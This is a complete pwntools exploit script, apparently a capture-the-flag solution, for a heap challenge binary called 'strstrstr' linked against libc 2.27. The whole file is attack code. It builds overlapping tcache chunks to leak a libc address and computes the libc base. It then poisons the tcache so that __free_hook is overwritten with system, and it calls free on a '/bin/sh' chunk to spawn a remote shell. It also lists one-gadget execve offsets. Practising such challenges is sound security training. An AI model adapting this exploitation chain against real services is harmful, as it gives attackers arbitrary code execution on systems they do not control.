from pwn import *
context.log_level = 'debug'

TARGET = './strstrstr'
LIBC = './libc-2.27.so'
HOST = 'localhost'
PORT = 10007

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def store(index, string): 
    r.sendlineafter('command:', '0')
    r.sendlineafter('index:', str(index))
    r.sendlineafter('string:', string)

def show(index):
    r.sendlineafter('command:', '1')
    r.sendlineafter('index:', str(index))
    return r.recvuntil('\n')

def delete(index):
    r.sendlineafter('command:', '2')
    r.sendlineafter('index:', str(index))

n = 7
for i in range(n):
    store(i, 'A'*0xf8)


store(0xa, 'A'*0xf8)
store(0xb, 'B'*0x38)
store(0xc, 'C'*0xf8)
store(0xd, 'D'*0x18)
store(0xe, 'X'*0x18)

for i in range(n):
    delete(n-1-i)


delete(0xa)
for i in range(0x38-0x30):
    delete(0xb)
    store(0xb, chr(0x30+i)*(0x38-i))
delete(0xb)
store(0xb, 'F'*0x30+'\x40\x01')
delete(0xc)

store(0xf, 'Z'*0xb7)
store(0xf, 'Z'*0x37)

leak = u64(show(0xb)[1:-1].ljust(8, '\x00'))
base = leak - (0x00007f8c9bff7ca0 - 0x00007f8c9bc0c000)
dbg("leak")
dbg("base")

system = base + libc.sym['system']
binsh = base + next(libc.search("/bin/sh"))
malloc_hook = base + 0x3ebc30
free_hook = base + 0x3ed8e8
gadget = [
    0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
    0x4f322, # execve("/bin/sh", rsp+0x40, environ)
    0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]

store(0xe, '1'*0x17) # pointing same chunk with # 0xb
store(1, "/bin/sh")
delete(0xe)
delete(0xb)

store(0, p64(free_hook))
pause()
store(0, "hoge")
store(0, p64(system))



r.sendlineafter('command:', '2')
r.sendlineafter('index:', '1')

r.interactive() 
r.close()
